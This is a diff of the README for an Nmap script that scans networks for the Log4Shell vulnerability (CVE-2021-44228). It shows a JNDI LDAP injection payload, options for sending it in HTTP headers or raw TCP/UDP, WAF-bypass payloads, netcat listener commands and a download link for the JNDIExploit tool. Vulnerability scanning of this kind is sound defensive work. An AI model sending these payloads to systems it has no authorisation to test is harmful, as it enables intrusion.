@@ -1,5 +1,9 @@
 # Nmap Log4Shell NSE script for discovery Apache Log4j RCE (CVE-2021-44228)
 
+`nmap-log4shell` is a Nmap script to check the **log4shell** vulnerability across the network. The script is able to inject the **log4shell** exploit payload via HTTP Headers (default) or via Socket (TCP or UDP).
+
+## Vulnerability
+
 **CVE-2021-44228** is a remote code execution (RCE) vulnerability in Apache Log4j 2. An unauthenticated, remote attacker could exploit this flaw by sending a specially crafted request to a server running a vulnerable version of log4j. The crafted request uses a Java Naming and Directory Interface (JNDI) injection via a variety of services including:
 
 -  Lightweight Directory Access Protocol (LDAP)
@@ -33,9 +37,10 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
     | log4shell: 
     |   Payloads:
     |     ${jndi:ldap:/172.17.42.1:389/log4shell}
-    |   Path: /
-    |   Method: GET
-    |   Headers: 
+    |   Test Method: HTTP
+    |   URL Path: /
+    |   HTTP Method: GET
+    |   HTTP Headers: 
     |     Access-Control-Request-Method: 200 
     |     Accept: 200 
     |     Access-Control-Request-Headers: 200 
@@ -76,16 +81,39 @@ Copy the provided script (log4shell.nse) into that directory run `nmap --script-
     |     Origin: 200 
     |_  Note: (!) Inspect the callback server (172.17.42.1:389) or web-application (172.17.42.2:8080) logs
 
-#### Arguments
+
+### Arguments
 
 - `log4shell.callback-server`: The callback server (eg. `172.17.42.1:1389`)
 - `log4shell.http-headers`: Comma-separated list of HTTP headers (eg. `X-Api-Version,User-Agent,Referer`)
 - `log4shell.http-method`: HTTP method (default: `GET`)
 - `log4shell.url-path`: URL path (default: `/`)
 - `log4shell.waf-bypass`: Use WAF bypass payloads (default: `false`)
+- `log4shell.test-method`: Test through `http` (default), `tcp`, `udp` or `all`
 
 
-### Method A:
+### Callback Server
+
+The script relies on callbacks from the target being scanned and hence any firewall rules or interaction with other security devices will affect the efficacy of the script.
+
+
+#### Netcat or Ncat
+
+Listen a TCP port with netcat (or ncat):
+
+    ncat -vkl 1389   # Ncat
+    nc -lvnp 1389    # Netcat
+
+Run Nmap with --script log4shell.nse script
+
+    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
+
+See the target IP address in netcat (or ncat) output:
+
+    Ncat: Connection from 172.17.0.2.
+    Ncat: Connection from 172.17.0.2:38898.
+
+#### JNDIExploit
 
 Download JNDIExploit from GitHub (https://github.com/giterlizzi/JNDIExploit/releases/download/v1.2/JNDIExploit.zip)
 
@@ -101,22 +129,6 @@ See JNDIExploit output for see the received LDAP query
 
     [+] Received LDAP Query: log4shell
     [!] Invalid LDAP Query: log4shell
-
-### Method B:
-
-Listen a TCP port with netcat (or ncat):
-
-    ncat -vkl 1389   # Ncat
-    nc -lvnp 1389    # Netcat
-
-Run Nmap with --script log4shell.nse script
-
-    nmap --script log4shell.nse [--script-args log4shell.callback-server=127.0.0.1:1389] [-p <port>] <target>
-
-See the target IP address in netcat (or ncat) output:
-
-    Ncat: Connection from 172.17.0.2.
-    Ncat: Connection from 172.17.0.2:38898.
 
 
 # Legal Disclaimer
